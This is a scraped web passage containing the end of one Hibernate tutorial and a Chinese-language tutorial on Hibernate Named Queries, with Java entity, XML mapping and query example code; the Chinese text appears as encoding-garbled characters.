<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä»é…ç½®æ–‡ä»¶åˆ›å»ºSessionFactory</span>
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            <span class="hljs-comment">// è®°å½•å¯åŠ¨å¤±è´¥çš„é”™è¯¯</span>
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
</li>
<li>
<p><strong>ä½¿ç”¨è¿æ¥æ± ç¤ºä¾‹</strong>ï¼šæ¼”ç¤ºå¦‚ä½•ä½¿ç”¨é…ç½®çš„è¿æ¥æ± æ’å…¥æ•°æ®ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateConnectionPoolExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// è·å–SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// æ’å…¥æ•°æ®</span>
        insertSampleData(sessionFactory);

        <span class="hljs-comment">// å…³é—­SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertSampleData</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        
</code></pre>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ30ï¼‰Hibernateçš„Named Queryæ˜¯ä»€ä¹ˆï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592815497847980095</link>    <guid>https://juejin.cn/post/7592815497847980095</guid>    <pubDate>2026-01-08T12:15:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592815497847980095" data-draft-id="7592815497847963711" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ30ï¼‰Hibernateçš„Named Queryæ˜¯ä»€ä¹ˆï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-08T12:15:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ30ï¼‰Hibernateçš„Named Queryæ˜¯ä»€ä¹ˆï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T12:15:43.000Z" title="Thu Jan 08 2026 12:15:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">Hibernateçš„Named Query</h3>
<p>Named Queryï¼ˆå‘½åæŸ¥è¯¢ï¼‰æ˜¯Hibernateæä¾›çš„ä¸€ç§æœºåˆ¶ï¼Œå…è®¸å¼€å‘è€…åœ¨å®ä½“ç±»æˆ–æ˜ å°„æ–‡ä»¶ä¸­å®šä¹‰é™æ€çš„SQLæˆ–HQLæŸ¥è¯¢ã€‚å‘½åæŸ¥è¯¢çš„å¥½å¤„åŒ…æ‹¬ï¼š</p>
<ul>
<li>ä»£ç å¤ç”¨ï¼šå¯ä»¥åœ¨å¤šä¸ªåœ°æ–¹ä½¿ç”¨ç›¸åŒçš„æŸ¥è¯¢ã€‚</li>
<li>é¢„ç¼–è¯‘ï¼šå‘½åæŸ¥è¯¢åœ¨åº”ç”¨å¯åŠ¨æ—¶è¢«é¢„ç¼–è¯‘ï¼Œè¿è¡Œæ—¶æ€§èƒ½æ›´å¥½ã€‚</li>
<li>å¯ç»´æŠ¤æ€§ï¼šæŸ¥è¯¢é€»è¾‘åˆ†ç¦»ï¼Œä¾¿äºç»´æŠ¤å’Œç®¡ç†ã€‚</li>
</ul>
<h3 data-id="heading-1">å®šä¹‰Named Query</h3>
<p>Named Queryå¯ä»¥ä½¿ç”¨æ³¨è§£æˆ–XMLé…ç½®æ¥å®šä¹‰ï¼š</p>
<ol>
<li><strong>æ³¨è§£æ–¹å¼</strong>ï¼š
<ul>
<li>ä½¿ç”¨<code>@NamedQuery</code>å’Œ<code>@NamedQueries</code>æ³¨è§£ã€‚</li>
</ul>
</li>
<li><strong>XMLé…ç½®æ–¹å¼</strong>ï¼š
<ul>
<li>åœ¨Hibernateçš„æ˜ å°„æ–‡ä»¶ä¸­ä½¿ç”¨<code>&lt;query&gt;</code>æ ‡ç­¾ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-2">ç¤ºä¾‹ä»£ç </h3>
<h4 data-id="heading-3">ä½¿ç”¨æ³¨è§£å®šä¹‰Named Query</h4>
<h5 data-id="heading-4">å®ä½“ç±» <code>Person</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "person")</span>
<span class="hljs-meta">@NamedQueries({
    @NamedQuery(
        name = "Person.findByName",
        query = "FROM Person WHERE name = :name"
    ),
    @NamedQuery(
        name = "Person.findAll",
        query = "FROM Person"
    )
})</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "age")</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-comment">// Getters å’Œ Setters</span>

    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> age;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.age = age;
    }
}
</code></pre>
<h4 data-id="heading-5">ä½¿ç”¨XMLé…ç½®å®šä¹‰Named Query</h4>
<h5 data-id="heading-6">é…ç½®æ–‡ä»¶ <code>Person.hbm.xml</code></h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-mapping</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Mapping DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-mapping-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-mapping</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">class</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"com.example.domain.Person"</span> <span class="hljs-attr">table</span>=<span class="hljs-string">"person"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"id"</span> <span class="hljs-attr">column</span>=<span class="hljs-string">"id"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">generator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"identity"</span>/&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"name"</span> <span class="hljs-attr">column</span>=<span class="hljs-string">"name"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"age"</span> <span class="hljs-attr">column</span>=<span class="hljs-string">"age"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Named Queries --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">query</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Person.findByName"</span>&gt;</span>
        &lt;![CDATA[
            FROM Person WHERE name = :name
        ]]&gt;
    <span class="hljs-tag">&lt;/<span class="hljs-name">query</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">query</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Person.findAll"</span>&gt;</span>
        &lt;![CDATA[
            FROM Person
        ]]&gt;
    <span class="hljs-tag">&lt;/<span class="hljs-name">query</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-mapping</span>&gt;</span>
</code></pre>
<h4 data-id="heading-7">ä½¿ç”¨Named Queryç¤ºä¾‹</h4>
<h5 data-id="heading-8">HibernateUtilç±»</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä»é…ç½®æ–‡ä»¶åˆ›å»ºSessionFactory</span>
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            <span class="hljs-comment">// è®°å½•å¯åŠ¨å¤±è´¥çš„é”™è¯¯</span>
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<h5 data-id="heading-9">æŸ¥è¯¢ç¤ºä¾‹</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.query.Query;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateNamedQueryExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// è·å–SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// æ’å…¥ç¤ºä¾‹æ•°æ®</span>
        insertSampleData(sessionFactory);

        <span class="hljs-comment">// ä½¿ç”¨Named QueryæŸ¥è¯¢æ•°æ®</span>
        queryByName(sessionFactory, <span class="hljs-string">"John Doe"</span>);
        queryAll(sessionFactory);

        <span class="hljs-comment">// å…³é—­SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertSampleData</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Person</span> <span class="hljs-variable">person1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"John Doe"</span>, <span class="hljs-number">30</span>);
            <span class="hljs-type">Person</span> <span class="hljs-variable">person2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"Jane Doe"</span>, <span class="hljs-number">28</span>);

            session.save(person1);
            session.save(person2);
            transaction.commit();
            System.out.println(<span class="hljs-string">"Inserted sample data"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">queryByName</span><span class="hljs-params">(SessionFactory sessionFactory, String name)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-keyword">try</span> {
            Query&lt;Person&gt; query = session.createNamedQuery(<span class="hljs-string">"Person.findByName"</span>, Person.class);
            query.setParameter(<span class="hljs-string">"name"</span>, name);
            List&lt;Person&gt; persons = query.getResultList();
            System.out.println(<span class="hljs-string">"Query by name ("</span> + name + <span class="hljs-string">"):"</span>);
            <span class="hljs-keyword">for</span> (Person person : persons) {
                System.out.println(person.getName() + <span class="hljs-string">" - "</span> + person.getAge());
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">queryAll</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-keyword">try</span> {
            Query&lt;Person&gt; query = session.createNamedQuery(<span class="hljs-string">"Person.findAll"</span>, Person.class);
            List&lt;Person&gt; persons = query.getResultList();
            System.out.println(<span class="hljs-string">"Query all persons:"</span>);
            <span class="hljs-keyword">for</span> (Person person : persons) {
                System.out.println(person.getName() + <span class="hljs-string">" - "</span> + person.getAge());
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-10">Named Queryè¯¦ç»†è§£é‡Š</h3>
<ol>
<li>
<p><strong>æ³¨è§£æ–¹å¼å®šä¹‰Named Query</strong>ï¼šåœ¨<code>Person</code>å®ä½“ç±»ä¸Šä½¿ç”¨<code>@NamedQuery</code>å’Œ<code>@NamedQueries</code>æ³¨è§£å®šä¹‰æŸ¥è¯¢ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@NamedQueries({
    @NamedQuery(
        name = "Person.findByName",
        query = "FROM Person WHERE name = :name"
    ),
    @NamedQuery(
        name = "Person.findAll",
        query = "FROM Person"
    )
})</span>
</code></pre>
</li>
<li>
<p><strong>XMLé…ç½®æ–¹å¼å®šä¹‰Named Query</strong>ï¼šåœ¨<code>Person.hbm.xml</code>ä¸­ä½¿ç”¨<code>&lt;query&gt;</code>æ ‡ç­¾å®šä¹‰æŸ¥è¯¢ã€‚</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">query</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Person.findByName"</span>&gt;</span>
    &lt;![CDATA[
        FROM Person WHERE name = :name
    ]]&gt;
<span class="hljs-tag">&lt;/<span class="hljs-name">query</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">query</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Person.findAll"</span>&gt;</span>
    &lt;![CDATA[
        FROM Person
    ]]&gt;
<span class="hljs-tag">&lt;/<span class="hljs-name">query</span>&gt;</span>
</code></pre>
</li>
<li>
<p><strong>HibernateUtilç±»</strong>ï¼šåˆ›å»ºå¹¶ç®¡ç†SessionFactoryã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä»é…ç½®æ–‡ä»¶åˆ›å»ºSessionFactory</span>
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            <span class="hljs-comment">// è®°å½•å¯åŠ¨å¤±è´¥çš„é”™è¯¯</span>
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
</li>
<li>
<p><strong>ä½¿ç”¨Named Queryç¤ºä¾‹</strong>ï¼šæ¼”ç¤ºå¦‚ä½•ä½¿ç”¨Named Queryè¿›è¡ŒæŸ¥è¯¢ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateNamedQueryExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// è·å–SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// æ’å…¥ç¤ºä¾‹æ•°æ®</span>
        insertSampleData(sessionFactory);

        <span class="hljs-comment">// ä½¿ç”¨Named QueryæŸ¥è¯¢æ•°æ®</span>
        queryByName(sessionFactory, <span class="hljs-string">"John Doe"</span>);
        queryAll(sessionFactory);

        <span class="hljs-comment">// å…³é—­SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertSampleData</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Person</span> <span class="hljs-variable">person1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"John Doe"</span>, <span class="hljs-number">30</span>);
            <span class="hljs-type">Person</span> <span class="hljs-variable">person2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"Jane Doe"</span>, <span class="hljs-number">28</span>);

            session.save(person1);
            session.save(person2);
            transaction.commit();
            System.out.println(<span class="hljs-string">"Inserted sample data"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">queryByName</span><span class="hljs-params">(SessionFactory sessionFactory, String name)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-keyword">try</span> {
            Query&lt;Person&gt; query = session.createNamedQuery(<span class="hljs-string">"Person.findByName"</span>, Person.class);
            query.setParameter(<span class="hljs-string">"name"</span>, name);
            List&lt;Person&gt; persons = query.getResultList();
            System.out.println(<span class="hljs-string">"Query by name ("</span> + name + <span class="hljs-string">"):"</span>);
            <span class="hljs-keyword">for</span> (Person person : persons) {
                System.out.println(person.getName() + <span class="hljs-string">" - "</span> + person.getAge());
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }
    }

</code></pre>
</li>
